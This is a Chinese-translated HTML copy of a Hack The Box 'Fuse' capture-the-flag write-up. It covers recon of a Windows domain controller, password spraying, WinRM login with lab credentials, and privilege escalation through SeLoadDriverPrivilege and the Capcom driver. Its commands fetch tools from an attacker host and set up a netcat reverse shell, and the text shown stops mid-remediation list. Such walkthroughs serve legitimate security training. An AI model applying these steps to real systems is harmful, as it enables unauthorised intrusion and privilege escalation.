<html>
<head>
<title>HTB Fuse [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB导火线[报道]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-fuse-writeup-2c181d837b78?source=collection_archive---------0-----------------------#2020-10-31">https://infosecwriteups.com/htb-fuse-writeup-2c181d837b78?source=collection_archive---------0-----------------------#2020-10-31</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="18e3" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">域控制器侦测|密码喷洒|暴力攻击|<strong class="ak">SeLoadDriverPrivilege Abuse</strong></h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/e9e6d09b3a57ef84b02e5ed94794e031.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9hHBBXg9ndCNoadUXHRHWA.png"/></div></div></figure><h1 id="bd8e" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">摘要</h1><p id="9675" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">这台机器快把我逼疯了！如果没有已经在这台机器上扎根的人的指导，要打开这个盒子是非常困难的。</p><p id="cabd" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">有了这台机器，一步一个脚印在这里是有益的。运行nmap扫描或继续向下滚动，你会知道为什么:nmap结果表明它是一个域控制器。最初，从手动站点检查开始，并捕获所有公开的数据。接下来，我将收集的信息用于所有开放端口服务。经过长时间的侦察/枚举、密码喷射攻击和暴力破解，我终于找到了一个可以访问shell的帐户。</p><p id="c60d" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">对于Root一旦发现漏洞，google会搜索其漏洞并将其作为利用该机器的指南。</p><p id="2f9a" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu"> <em class="mi">注意:</em> </strong> <em class="mi">有些工具可能无法提供想要的结果。因此，使用另一个类似的工具来验证它，并注意输出。</em></p></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><p id="963b" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">操作系统和架构:</strong> Windows Server 2016标准版14393 (Windows Server 2016标准版6.3)</p><p id="7b35" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">使用的工具&amp;命令:</strong><code class="fe mv mw mx my b">nmap</code>|<code class="fe mv mw mx my b">cewl</code>|<code class="fe mv mw mx my b">msfconsole</code>|<code class="fe mv mw mx my b">smbclient</code>|<code class="fe mv mw mx my b">rpcclient</code>|<code class="fe mv mw mx my b">smbpasswd</code>|<code class="fe mv mw mx my b">wget</code>|<code class="fe mv mw mx my b">nc</code>|<code class="fe mv mw mx my b">evil-winrm.rb</code></p><p id="25dd" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu"> CVE(美):</strong>不适用</p><p id="a846" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">利用:</strong> <a class="ae mz" href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">滥用SeLoadDriverPrivilege </a></p></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><h1 id="c484" class="ku kv it bd kw kx na kz la lb nb ld le jz nc ka lg kc nd kd li kf ne kg lk ll bi translated">侦察和计数</h1><p id="22e7" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated"><strong class="lo iu"> Nmap输出</strong></p><p id="05cd" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu"> ***TCP端口* * *</strong><br/><code class="fe mv mw mx my b">PORT STATE SERVICE VERSION<br/>53/tcp open domain?<br/>| fingerprint-strings: <br/>| DNSVersionBindReqTCP: <br/>| version<br/>|_ bind<br/>80/tcp open http Microsoft IIS httpd 10.0<br/>| http-methods: <br/>|_ Potentially risky methods: TRACE</code><br/><code class="fe mv mw mx my b">|_http-server-header: Microsoft-IIS/10.0<br/>|_http-title: Site doesn’t have a title (text/html).<br/>88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020–08–28 18:08:41Z)<br/>135/tcp open msrpc Microsoft Windows RPC<br/>139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br/>389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)<br/>445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)<br/>464/tcp open kpasswd5?<br/>593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br/>636/tcp open tcpwrapped<br/>3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)<br/>3269/tcp open tcpwrapped<br/>5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>9389/tcp open mc-nmf .NET Message Framing<br/>49666/tcp open msrpc Microsoft Windows RPC</code><br/><code class="fe mv mw mx my b">49667/tcp open msrpc Microsoft Windows RPC<br/>49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br/>49676/tcp open msrpc Microsoft Windows RPC<br/>49679/tcp open msrpc Microsoft Windows RPC<br/>49695/tcp open msrpc Microsoft Windows RPC<br/>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a class="ae mz" href="https://nmap.org/cgi-bin/submit.cgi?new-service" rel="noopener ugc nofollow" target="_blank">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br/>SF-Port53-TCP:V=7.80%I=7%D=8/28%Time=5F494370%P=x86_64-pc-linux-gnu%r(DNSV<br/>SF:ersionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\<br/>SF:x04bind\0\0\x10\0\x03");<br/>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br/>Device type: general purpose<br/>Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)<br/>OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607</code><br/><code class="fe mv mw mx my b">Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)<br/>No exact OS matches for host (test conditions non-ideal).<br/>Network Distance: 2 hops<br/>Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows</code></p><p id="ed80" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><code class="fe mv mw mx my b">Host script results:<br/>|_clock-skew: mean: 2h40m14s, deviation: 4h02m31s, median: 20m13s<br/>| smb-os-discovery: <br/>| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br/>| Computer name: Fuse<br/>| NetBIOS computer name: FUSE\x00<br/>| Domain name: fabricorp.local</code> <br/> <code class="fe mv mw mx my b">| Forest name: fabricorp.local<br/>| FQDN: Fuse.fabricorp.local<br/>|_ System time: 2020–08–28T11:11:04–07:00<br/>| smb-security-mode: <br/>| account_used: &lt;blank&gt;<br/>| authentication_level: user<br/>| challenge_response: supported<br/>|_ message_signing: required<br/>| smb2-security-mode: <br/>| 2.02: <br/>|_ Message signing enabled and required<br/>| smb2-time: <br/>| date: 2020–08–28T18:11:02<br/>|_ start_date: 2020–08–28T18:04:52</code></p><p id="ddac" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu"> ***UDP端口*** </strong> <br/> <code class="fe mv mw mx my b">PORT STATE SERVICE <br/>53/udp open domain <br/>123/udp open ntp <br/>389/udp open ldap</code></p></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><p id="4be7" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu"> **************端口80 http微软IIS httpd 10.0 * * * * * * * * * * * * * * * * *</strong></p><p id="4984" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">浏览网站http://10.10.10.193时，请注意底部的网站响应，内容如下:</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/5aea3ac9fa20db156af981626108483e.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*1Yfn3cmYTprlH2Eg9i26vQ.png"/></div></figure><p id="9a29" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用<strong class="lo iu"> /etc/hosts </strong>文件设置一个本地DNS，将该子域映射到10.10.10.193</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ng"><img src="../Images/51eab6df4f0cc37b34254ab397f9e27d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GiT61Y22181iVVjj9myyow.png"/></div></div><figcaption class="nh ni gj gh gi nj nk bd b be z dk translated"><strong class="bd kw">主页面</strong></figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nl"><img src="../Images/a4258ed6387d461a5c0ea73342d9f981.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HoF6scnZea0nTiInwWrEpA.png"/></div></div><figcaption class="nh ni gj gh gi nj nk bd b be z dk translated"><strong class="bd kw">潜在用户</strong></figcaption></figure><p id="b0ba" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">创建一个user.txt并保存找到的用户名:<strong class="lo iu"> pmerton </strong>和<strong class="lo iu">t level</strong>。</p><p id="93d1" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用<code class="fe mv mw mx my b">cewl</code>，我创建了网站主页的单词表，它有可能被用来找回密码。</p><blockquote class="nm nn no"><p id="8d32" class="lm ln mi lo b lp mj ju lr ls mk jx lu np ml lx ly nq mm mb mc nr mn mf mg mh im bi translated"><code class="fe mv mw mx my b">cewl -w wordlists.txt -d 10 — with-numbers <a class="ae mz" href="http://fuse.fabricorp.local/papercut/logs/html/index.htm" rel="noopener ugc nofollow" target="_blank">http://fuse.fabricorp.local/papercut/logs/html/index.htm</a></code></p></blockquote></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><p id="3534" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">* * * * * * * * * * * * * * * * * *端口445/TCP Windows Server 2016 Standard 14393 Microsoft-ds或域控制器*********************** </strong></p><p id="ad85" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">当捕获的用户名和单词列表用于smb登录时，我找到了登录SMB的正确用户名和密码。</p><blockquote class="nm nn no"><p id="683c" class="lm ln mi lo b lp mj ju lr ls mk jx lu np ml lx ly nq mm mb mc nr mn mf mg mh im bi translated">辅助(扫描仪/SMB/SMB _登录)</p></blockquote><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ns"><img src="../Images/039fb7d8595e4e291f8f4a4bb185072a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ILv3CPRSkR4wNz03FAYvbg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nt"><img src="../Images/99128a667c934da6a3b458dfb3d80746.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bVHzDxGiqPVU0LTY700bYw.png"/></div></div></figure><p id="849a" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">登录smbclient后，它会提示我先更改密码。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nu"><img src="../Images/b9e4f1dcb81152ae6c0140c2356d7636.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VyrKDlqafIfvm6i1iq3Aqg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nv"><img src="../Images/667f572a3365ba437c18de42cb8b483c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3cWSwM7ZQFAp1xwF8enjJA.png"/></div></div></figure><p id="847f" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">密码更改后，我可以看到以下共享名。然而，后来我什么也做不了，所以我把注意力转向了其他开放港口服务。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nu"><img src="../Images/8937916fa6af7dcc3206da99d10d6f6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uPomRy0EUrifShBprMC4Hg.png"/></div></div></figure></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><h1 id="10a9" class="ku kv it bd kw kx na kz la lb nb ld le jz nc ka lg kc nd kd li kf ne kg lk ll bi translated">据点</h1><p id="fd7b" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated"><strong class="lo iu"> **********************端口135 RPC * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="b766" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用smb登录凭证:<strong class="lo iu"> tlavel:Fabricorp01 </strong>，<strong class="lo iu"> </strong>错误消息指示密码更改。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nw"><img src="../Images/f1a44463929cdd98aed9814f32d76cea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-b4xmq1HPoK9MPeNtA0vrw.png"/></div></div></figure><p id="a6fe" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">但是，当使用更新的smb凭据时，我获得了访问权限。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nx"><img src="../Images/07ccdad10cb10281a64214c9205cf180.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1wmupB0josiDHb1uT7hGVg.png"/></div></div></figure><p id="178c" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">以下所有用户名都已添加到我的用户列表中</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/b2d088f5e2880881c0e44fe5477a6de8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*yjYe6jkutUqKu0D8FKIKtg.png"/></div></figure><p id="ed65" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">最后，我找到了可以帮助我们得到外壳的密码。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nz"><img src="../Images/e2f2a639f2751af1f19c37f70f6c0ebe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mljeFwg2KPB0QtJdumNsrg.png"/></div></div></figure><h1 id="75ca" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">反向外壳</h1><p id="f9ce" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated"><strong class="lo iu">* * * * * * * * * * * *端口5985 http微软HTTP API httpd 2.0(SSDP/UPnP)* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><p id="571a" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用<code class="fe mv mw mx my b">msfconsole &gt; auxiliary/scanner/winrm/winrm_login</code>，我强制winrm的凭证向Winrm服务认证。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oa"><img src="../Images/68b149d890024ab9eb06319ec651d08e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1qnosv1ZZ2ZJ0kn9gYugSA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ob"><img src="../Images/c39c99721ab425a2037dbb7cb901702b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OU3gF1DTIAoR9bJcc8Ppcw.png"/></div></div></figure><p id="e8b1" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">为了验证上述结果，我使用了另一个名为<strong class="lo iu"> crackmapexec </strong>的工具，该工具也尝试对Winrm服务进行身份验证。</p><p id="b346" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">注意下面:只有用户<strong class="lo iu"> svc-print </strong>有<em class="mi">“访问被拒绝”</em>，而其余用户显示<em class="mi">“指定的凭证被服务器拒绝”</em></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oc"><img src="../Images/b049bedd54abf8e765e3fe5bc9f5d08c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MaHOniB6ucE_KbcSaElGNQ.png"/></div></div></figure><p id="61bf" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">要登录到winrm，请使用以下命令:</p><blockquote class="nm nn no"><p id="f838" class="lm ln mi lo b lp mj ju lr ls mk jx lu np ml lx ly nq mm mb mc nr mn mf mg mh im bi translated"><code class="fe mv mw mx my b">sudo ruby evil-winrm.rb -u svc-print -p ‘$fab@s3Rv1ce$1’ -i 10.10.10.193</code></p></blockquote><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi od"><img src="../Images/30de039b4dd1188188537c28b6b9cf00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hKzsHiqT5C8jVvC1n-Fv0A.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oe"><img src="../Images/348568af44c0a7475a29099f0dd1589e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g8gR4wbJWPTqR7cEOrJHKg.png"/></div></div></figure></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><h1 id="4fc6" class="ku kv it bd kw kx na kz la lb nb ld le jz nc ka lg kc nd kd li kf ne kg lk ll bi translated">横向运动</h1><p id="e54f" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">这里我们可以看到<strong class="lo iu"> SetLoadDriverPrivilege </strong>被<strong class="lo iu">启用。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi of"><img src="../Images/3ad7c4517be98e37483187750aa90a3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*En9MEUZ5JxhRiQZ36hvzvA.png"/></div></div></figure><h1 id="51bc" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">权限提升</h1><p id="8938" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">有一个<a class="ae mz" href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">漏洞</a>可用于滥用<strong class="lo iu"> SeLoadDriverPrivilege </strong>进行权限升级。</p><p id="8d48" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">第一步。</strong>创建一个netcat.bat文件</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi og"><img src="../Images/9e6c6e61a681f18ffe98b006656ec96b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*81Iazoma6s--keBYhCiQKw.png"/></div></div></figure><p id="4def" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">第二步:</strong>下载并上传所有需要的文件到受害机器。这包括:</p><ul class=""><li id="cfa8" class="oh oi it lo b lp mj ls mk lv oj lz ok md ol mh om on oo op bi translated"><a class="ae mz" href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" rel="noopener ugc nofollow" target="_blank"> capcom.sys </a></li><li id="68f8" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated"><a class="ae mz" href="https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp" rel="noopener ugc nofollow" target="_blank"> ExploitCapcom.cpp </a></li><li id="e69e" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated"><a class="ae mz" href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" rel="noopener ugc nofollow" target="_blank">peoploaddriver . CPP</a></li><li id="522f" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated">nc.exe</li><li id="8ec4" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated">netcat.bat</li></ul><p id="0b21" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">注</strong>:即<em class="mi">。cpp </em>已经转换为<em class="mi">。从这个<a class="ae mz" href="https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse" rel="noopener ugc nofollow" target="_blank">站点</a>获取的exe </em>。</p><p id="77b4" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用以下命令，上传所有需要的文件:</p><p id="2011" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><code class="fe mv mw mx my b">wget <a class="ae mz" href="http://10.10.14.2/netcat.bat" rel="noopener ugc nofollow" target="_blank">http://10.10.14.2/&lt;</a>filename&gt; -o &lt;filename&gt;</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ov"><img src="../Images/8b2716c32111eac3c71720bd727a2c0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M_j1h8RhJrE0sB2z7HKv8A.png"/></div></div></figure><p id="ed76" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">运行EOPLOADDRIVER.exe程序后，我们可以将下面的例子用于<strong class="lo iu">步骤4。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ow"><img src="../Images/0952c82e70345ff7c9d94bff6ce326f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nAUjH-BdhD_8A2qDxJnMrg.png"/></div></div></figure><p id="04f2" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">步骤3: </strong>启动主机上的监听端口。</p><p id="95bf" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">第4步:</strong>最后运行以下命令来获取shell</p><blockquote class="nm nn no"><p id="9636" class="lm ln mi lo b lp mj ju lr ls mk jx lu np ml lx ly nq mm mb mc nr mn mf mg mh im bi translated"><code class="fe mv mw mx my b">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\check\Capcom.sys</code></p><p id="d222" class="lm ln mi lo b lp mj ju lr ls mk jx lu np ml lx ly nq mm mb mc nr mn mf mg mh im bi translated"><code class="fe mv mw mx my b">.\ExploitCapcom.exe</code></p></blockquote><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ox"><img src="../Images/a3af5dc4378afd55e3578f8e5bbc0648.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XGglGJ4MV16PkfghCtH7lQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oe"><img src="../Images/c82fa3f945fdc8dcc73551f5cb2a3b0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OkXrkKDHl_yPZuOIKpacYg.png"/></div></div></figure><p id="0e5f" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">扎根！！！</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oy"><img src="../Images/0e3afbc4d50a4e05d3976456d2f508e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AuOpvBg25Ht1nREuG1jFkQ.png"/></div></div><figcaption class="nh ni gj gh gi nj nk bd b be z dk translated"><strong class="bd kw">成功了！！！</strong></figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oz"><img src="../Images/803978a402385a3bb433c1c7d82d89a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*jmoRGUg4n98ZKJHW5ZnAAw.gif"/></div></div></figure><h1 id="3271" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">补救</h1><ul class=""><li id="5d1c" class="oh oi it lo b lp lq ls lt lv pa lz pb md pc mh om on oo op bi translated">通过为不同的帐户设置唯一的密码来最小化攻击面。从而消除了密码喷涂攻击。</li><li id="4458" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated">避免将任何敏感数据暴露在公共托管网站上</li><li id="d3d9" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh om on oo op bi translated">禁用非特权用户的SeLoadDriverPrivilege，因为它可能会在内核空间执行代码并获得root权限。</li><li id="c42f" class="oh oi it lo b lp oq ls or lv os 